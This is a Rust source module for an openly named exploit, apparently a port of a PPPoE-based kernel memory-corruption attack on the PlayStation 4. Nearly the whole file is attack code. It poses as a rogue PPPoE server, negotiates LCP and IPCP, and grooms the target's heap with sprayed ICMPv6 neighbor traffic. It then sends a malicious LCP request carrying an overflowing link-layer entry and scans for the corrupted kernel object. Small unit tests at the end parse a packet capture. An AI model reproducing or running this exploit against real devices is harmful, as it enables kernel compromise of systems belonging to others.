// Import the constants module
use crate::constants;

// Import and re-export only what needs to be re exported.
mod lcp_echo_handler;
mod network_structs;
mod packet_checking;
mod packet_creation;
mod utils;

extern crate hwaddr;
extern crate packet;
extern crate pnet;

use packet::ether;
use packet::Builder;
use pnet::datalink::{DataLinkReceiver, DataLinkSender, NetworkInterface};
use std::convert::TryInto;
use std::process;
use std::str::FromStr;
use std::thread;
// Add this line to bring FromStr into scope
use std::time;

use packet_creation::{
    create_icmpv6_adv, create_icmpv6_echo_req, create_ipcp_conf_ack, create_ipcp_conf_nak,
    create_ipcp_conf_request, create_lcp_conf_ack, create_lcp_conf_request, create_pado_packet,
    create_pads_packet,
};

use packet_checking::{
    is_icmpv6_echo_reply, is_icmpv6_nd_ns, is_icmpv6_router_sol, is_ipcp_conf_ack,
    is_ipcp_conf_req, is_lcp_conf_ack, is_lcp_conf_reject, is_lcp_conf_req, is_padi_packet,
    is_padr_packet,
};

use utils::{create_ethernet_channel, listen_for_corruption, listen_for_packet};

use network_structs::{build_overflow_lle, create_fake_ifnet};

// Public re exports
pub use lcp_echo_handler::LcpEchoHandler;
pub struct Exploit {
    pub source_mac: [u8; 6],
    pub target_mac: [u8; 6],
    pub pppoe_softc: u64,
    pub host_uniq: [u8; 8],
    pub target_ipv6: [u8; 16],
}

impl Exploit {
    pub fn calc_planted(&mut self) {
        let planted = (self.pppoe_softc + 0x07) & 0xffffffffffff;
        let planted_bytes = planted.to_be_bytes();
        // Take the first 6 bytes of the 8-byte array and convert them to a fixed-size array
        let truncated_bytes: [u8; 6] = planted_bytes[2..8]
            .try_into()
            .expect("slice with incorrect length");
        self.source_mac = truncated_bytes;
        println!("[+] Source MAC: {:?}", self.source_mac);
    }

    pub fn ppp_negotiation(&mut self, interface: &NetworkInterface) {
        println!("[*] Starting PPP Negotiation...");
        let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();

        let padi = listen_for_packet(rx.as_mut(), is_padi_packet);
        self.handle_padi(&padi.unwrap());
        let pado = create_pado_packet(
            self.source_mac,
            self.target_mac,
            create_fake_ifnet(self.pppoe_softc),
            self.host_uniq,
        );
        let _result = tx
            .send_to(&pado, None)
            .expect("[-] Failed to send PADO packet");
        let _padr = listen_for_packet(rx.as_mut(), is_padr_packet);
        println!("[+] PADR Packet received");
        // Send PADS
        println!("[+] Sending PADS");
        let pads = create_pads_packet(
            self.source_mac,
            self.target_mac,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            self.host_uniq,
        );
        let _result = tx
            .send_to(&pads, None)
            .expect("[-] Failed to send PADS packet");
        println!("[+] PPP Negotiation Success!");
    }

    pub fn lcp_negotiation(&mut self, interface: &NetworkInterface) {
        //  Create LCP Configure request

        let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();

        println!("[*] Sending LCP configure request...");
        let lcp_configure = create_lcp_conf_request(
            self.source_mac,
            self.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            None,
        );
        let _result = tx
            .send_to(&lcp_configure, None)
            .expect("[-] Failed to send lcp_configure packet");

        println!("[*] Waiting for LCP configure ACK...");
        let _result = listen_for_packet(rx.as_mut(), is_lcp_conf_ack);
        println!("[*] Waiting for LCP configure request...");
        let result = listen_for_packet(rx.as_mut(), is_lcp_conf_req);
        println!("[*] Sending LCP configure ACK...");
        let id = u8::from_be_bytes([result.unwrap()[23]]);
        let lcp_conf_ack = create_lcp_conf_ack(
            self.source_mac,
            self.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            id,
        );
        let _result = tx
            .send_to(&lcp_conf_ack, None)
            .expect("[-] Failed to send lcp_conf_ack packet");
        println!("[*] LCP Negotiation Done.");
    }

    pub fn ipcp_negotiation(&mut self, interface: &NetworkInterface) {
        let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();
        // Send IPCP conf request
        println!("[*] Sending IPCP configure request...");
        let lcp_configure = create_ipcp_conf_request(
            self.source_mac,
            self.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            2, // TODO fix this
            constants::SOURCE_IPV4,
        );
        let _result = tx
            .send_to(&lcp_configure, None)
            .expect("[-] Failed to send IPCP configure req packet");
        // wait for Rec conf ack
        println!("[*] Waiting for IPCP configure ACK...");
        let _result = listen_for_packet(rx.as_mut(), is_ipcp_conf_ack);
        // wait for req conf
        println!("[*] Waiting for IPCP configure request...");
        let result = listen_for_packet(rx.as_mut(), is_ipcp_conf_req);
        let id = u8::from_be_bytes([result.unwrap()[23]]);
        // send nak
        println!("[*] Sending IPCP configure NAK...");
        let lcp_configure = create_ipcp_conf_nak(
            self.source_mac,
            self.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            id,
            constants::TARGET_IPV4,
        );
        let _result = tx
            .send_to(&lcp_configure, None)
            .expect("[-] Failed to send IPCP configure NAK packet");
        // wait for req conf
        println!("[*] Waiting for IPCP configure request...");
        let result: Option<Vec<u8>> = listen_for_packet(rx.as_mut(), is_ipcp_conf_req);
        let id = u8::from_be_bytes([result.unwrap()[23]]);
        // send conf ack
        println!("[*] Sending IPCP configure ACK...");
        let lcp_configure = create_ipcp_conf_ack(
            self.source_mac,
            self.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            id, // todo actually take it from the req
            constants::TARGET_IPV4,
            constants::FAKE_PRIMARY_DNS_SERVER,
        );
        let _result = tx
            .send_to(&lcp_configure, None)
            .expect("[-] Failed to send IPCP configure ACK packet");
        println!("[*] Finished IPCP Negotiation");
    }

    pub fn handle_padi(&mut self, data: &[u8]) {
        println!("[+] PADI packet received");
        // Extracting Host Unique Tag and populating the self.pppoe_softc
        self.host_uniq = extract_host_uniq(data).unwrap();
        self.pppoe_softc = u64::from_be_bytes(self.host_uniq);
        // Extract and update source mac
        self.target_mac = extract_ps4_source_mac(data).unwrap();
        println!("[+] Exploit Target MAC: {:?}", self.target_mac);
        self.calc_planted();
        let ac_cookie = create_fake_ifnet(self.pppoe_softc);
        println!("[+] AC cookie length: {:?}", ac_cookie.len());
    }

    pub fn heap_grooming(&mut self, interface: &NetworkInterface) {
        // Open channel
        let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();

        // Wait for the ICMPv6 Router Solicitation packet
        println!("[+] Waiting for Router Solicitation packet");
        let result = listen_for_packet(rx.as_mut(), is_icmpv6_router_sol);
        self.target_ipv6 = result.unwrap()[22..38].try_into().unwrap();
        println!("[+] Target IPv6 {:?}", self.target_ipv6);
        // Enters grooming loop
        spray(
            tx.as_mut(),
            rx.as_mut(),
            self.source_mac,
            self.target_mac,
            self.target_ipv6,
        );
        println!("[+] Heap grooming...done");
    }

    pub fn memory_corruption(&mut self, interface: &NetworkInterface) {
        // # Send invalid packet to trigger a printf in the kernel. For some
        // # reason, this causes scheduling on CPU 0 at some point, which makes
        // # the next allocation use the same per-CPU cache.
        // Open channel
        let (mut tx, mut rx) = create_ethernet_channel(interface).unwrap();

        pin_to_cpu_0(tx.as_mut(), self.source_mac, self.target_mac); //TODO whyb malformed packet different mac source? form yappwn and ppwn
        thread::sleep(time::Duration::from_secs(1));

        // Corrupt in6_llentry object
        let overflow_lle = build_overflow_lle(self.pppoe_softc);
        println!("[*] Sending malicious LCP configure request..."); // TODO send with A padding like malicious_lcp.pcap
        let mal_request = create_lcp_conf_request(
            self.source_mac,
            self.target_mac,
            0x00,
            constants::PPPOE_SESSION_ID.to_be_bytes(),
            Some(overflow_lle),
        );
        let _result = tx
            .send_to(&mal_request, None)
            .expect("[-] Failed to send IPCP configure req packet");
        println!("[*] Waiting for LCP configure reject...");
        listen_for_packet(rx.as_mut(), is_lcp_conf_reject);
        // Re-negotiate after rejection
        self.lcp_negotiation(interface);
        self.ipcp_negotiation(interface);

        let corrupted_source_ipv6: Option<[u8; 16]> = search_for_corrupted_obj(
            tx.as_mut(),
            rx.as_mut(),
            self.source_mac,
            self.target_mac,
            self.target_ipv6,
        );

        match corrupted_source_ipv6 {
            Some(source_ipv6) => {
                println!(
                    "[+] Scanning for corrupted object...found {:x?}",
                    source_ipv6
                );
            }
            None => {
                println!("[-] Scanning for corrupted object...failed. Please retry the exploit.");
                process::exit(1);
            }
        }
    }
}

fn pin_to_cpu_0(tx: &mut dyn DataLinkSender, source_mac: [u8; 6], target_mac: [u8; 6]) {
    for i in 0..constants::PIN_NUM {
        println!("[+] Pinning to CPU 0...{:?}%", 100 * i / constants::PIN_NUM);
        // Create etherpacket
        let packet = ether::Builder::default()
            .source(source_mac.into())
            .unwrap()
            .destination(target_mac.into())
            .unwrap()
            .protocol(ether::Protocol::PppoeSession)
            .unwrap()
            .build()
            .unwrap();
        // Send the request
        let _result = tx
            .send_to(packet.as_slice(), None)
            .expect("[-] Failed to send etherpacket");
        thread::sleep(time::Duration::from_millis(1));
    }
    println!("[+] Pinning to CPU 0...done")
}

fn extract_host_uniq(data: &[u8]) -> Result<[u8; 8], Box<dyn std::error::Error>> {
    let mut result = [0u8; 8];
    // Go to the tags
    let mut offset = constants::ETH_HEADER_LEN + constants::PPPOE_HEADER_LEN;
    // Read all the tags until possible
    while offset + constants::PPPOE_TAG_HEADER_LEN <= data.len() {
        // Read Header
        let tag_type = u16::from_be_bytes([data[offset], data[offset + 1]]);
        let tag_len = u16::from_be_bytes([data[offset + 2], data[offset + 3]]) as usize;
        offset += constants::PPPOE_TAG_HEADER_LEN;
        if tag_type == constants::PPPOE_TAG_HOST_UNIQ && offset + tag_len <= data.len() {
            // Extract the Host-Uniq tag value
            let host_uniq = &data[offset..offset + tag_len];
            if tag_len == 8 {
                // If Host-Uniq is expected to be a 64-bit integer, interpret it as Big-Endian
                result.copy_from_slice(host_uniq);
                println!("[+] Extracted Host-Uniq: {:?}", result);
                break;
            }
        }
        // Go to next tag
        offset += tag_len;
    }
    Ok(result)
}

fn extract_ps4_source_mac(data: &[u8]) -> Result<[u8; 6], Box<dyn std::error::Error>> {
    // Extract the source MAC address
    let offset = constants::ETH_SOURCE_MAC;
    let mac_bytes = &data[offset..offset + 6];

    // Create a 6-byte array and copy the data into it
    let mut mac_address = [0u8; 6];
    mac_address.copy_from_slice(mac_bytes);

    Ok(mac_address)
}

fn search_for_corrupted_obj(
    tx: &mut dyn DataLinkSender,
    rx: &mut dyn DataLinkReceiver,
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    target_v6: [u8; 16],
) -> Option<[u8; 16]> {
    for i in (0..constants::SPRAY_NUM).rev() {
        println!(
            "[+]Search for corrupted object at {:?}%",
            100 * i / constants::SPRAY_NUM
        );
        if i >= constants::HOLE_START && i % constants::HOLE_SPACE == 0 {
            println!("[-]HOLE");
            continue;
        }
        let source_v6_string = format!("fe80::{:04x}:4141:4141:4141", i);
        let source_v6: [u8; 16] = std::net::Ipv6Addr::from_str(&source_v6_string)
            .expect("Failed to parse IPv6 address")
            .octets();
        // listen for
        let icmpv6_req = create_icmpv6_echo_req(source_mac, target_mac, source_v6, target_v6);

        // Send the request
        let _result = tx
            .send_to(icmpv6_req.as_slice(), None)
            .expect("[-] Failed to send icmpv6");
        // Listen for packet if echo reply break,else if neighboard solicitation then corrupted
        let currupted = listen_for_corruption(rx);
        if !currupted {
            return None;
        }
        let icmpv6_adv = create_icmpv6_adv(source_mac, target_mac, source_v6, target_v6);
        // Send the request
        let _result = tx
            .send_to(icmpv6_adv.as_slice(), None)
            .expect("[-] Failed to send icmpv6adv");
        return Some(source_v6);
    }
    None
}

fn spray(
    tx: &mut dyn DataLinkSender,
    rx: &mut dyn DataLinkReceiver,
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    target_v6: [u8; 16],
) {
    for i in 0..constants::SPRAY_NUM {
        println!("[+] Heap Grooming at {:?}%", 100 * i / constants::SPRAY_NUM);
        let source_v6_string = format!("fe80::{:04x}:4141:4141:4141", i);
        let source_v6: [u8; 16] = std::net::Ipv6Addr::from_str(&source_v6_string)
            .expect("Failed to parse IPv6 address")
            .octets();
        let icmpv6_req = create_icmpv6_echo_req(source_mac, target_mac, source_v6, target_v6);

        // Send the request
        let _result = tx
            .send_to(icmpv6_req.as_slice(), None)
            .expect("[-] Failed to send icmpv6");
        //  Wait for response for each req
        let _result = listen_for_packet(rx, is_icmpv6_nd_ns);
        if i >= constants::HOLE_START && i % constants::HOLE_SPACE == 0 {
            println!("[-]HOLE");
            continue;
        }
        //  Sends advertisment only to certain response to create hole in the target heap

        let icmpv6_adv = create_icmpv6_adv(source_mac, target_mac, source_v6, target_v6);

        // Send the request
        let _result = tx
            .send_to(icmpv6_adv.as_slice(), None)
            .expect("[-] Failed to send icmpv6adv");
        let _result = listen_for_packet(rx, is_icmpv6_echo_reply);
    }
}

#[cfg(test)]
mod tests {

    use super::*;
    use pcap::Capture;

    fn get_test_ps4_mac() -> [u8; 6] {
        [0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97]
    }

    fn get_test_host_mac() -> [u8; 6] {
        [0x07, 0x2c, 0xf6, 0x06, 0xba, 0x9b]
    }

    fn get_test_host_unique() -> [u8; 8] {
        [0x00, 0x2c, 0xf6, 0x06, 0xba, 0x9b, 0xff, 0xff]
    }

    #[test]
    fn test_extract_host_uniq() {
        // Open the pcap file
        let mut cap = Capture::from_file("test_data/initial_two_padi.pcap")
            .expect("Failed to open pcap file");

        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                match extract_host_uniq(&packet) {
                    Ok(host_uniq) => {
                        println!("Extracted Host-Uniq: {:?}", host_uniq);
                        println!("Extracted Host-Uniq: {:?}", u64::from_be_bytes(host_uniq));
                        // Print the value as hexadecimal
                        println!(
                            "Converted value in hex: 0x{:016x}",
                            u64::from_be_bytes(host_uniq)
                        );

                        // Assert that the Host-Uniq value has the expected length
                        assert_eq!(host_uniq.len(), 8);
                        assert_eq!(u64::from_be_bytes(host_uniq), 0x002cf606ba9bffff)
                    }
                    Err(e) => {
                        panic!("Failed to extract Host-Uniq: {:?}", e);
                    }
                }
            }
        }
    }

    #[test]
    fn test_extract_source_mac() {
        // Open the pcap file
        let mut cap = Capture::from_file("test_data/initial_two_padi.pcap")
            .expect("Failed to open pcap file");

        while let Ok(packet) = cap.next_packet() {
            if is_padi_packet(&packet) {
                match extract_ps4_source_mac(&packet) {
                    Ok(source_mac) => {
                        println!("Extracted Source MAC Address: {:?}", source_mac);
                        // Assert that the MAC address has the expected length
                        assert_eq!(source_mac.len(), 6);
                        // Optionally, check the MAC address values
                        assert_eq!(&source_mac, &[0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97]);
                    }
                    Err(e) => {
                        panic!("Failed to extract Source MAC Address: {:?}", e);
                    }
                }
            }
        }
    }
}
